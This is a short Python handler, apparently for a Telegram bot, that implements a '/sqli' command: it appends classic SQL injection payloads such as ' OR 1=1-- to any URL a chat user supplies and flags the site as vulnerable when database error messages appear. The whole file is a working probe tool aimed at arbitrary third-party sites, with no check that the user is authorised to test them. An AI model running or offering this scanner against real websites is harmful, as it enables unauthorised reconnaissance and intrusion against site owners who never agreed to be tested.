import requests

payloads = [
    "'",
    "\"",
    "' OR 1=1--",
    "' OR '1'='1",
    "' OR 1=1#"
]

errors = [
    "sql syntax",
    "mysql",
    "warning",
    "odbc",
    "pdo",
    "syntax error",
    "database error"
]


async def test(update, context):

    if not context.args:
        await update.message.reply_text(
            "/sqli https://site.com?id="
        )
        return

    url = context.args[0]

    msg = await update.message.reply_text(
        "💉 SQL Injection Testing..."
    )

    vulnerable = False

    for p in payloads:
        try:
            r = requests.get(url + p, timeout=5)

            text = r.text.lower()

            if any(e in text for e in errors):
                vulnerable = True
                break

        except:
            pass

    if vulnerable:
        await msg.edit_text(
            "⚠️ Possible SQL Injection Found"
        )
    else:
        await msg.edit_text(
            "✅ SQL Injection Not Detected"
        )
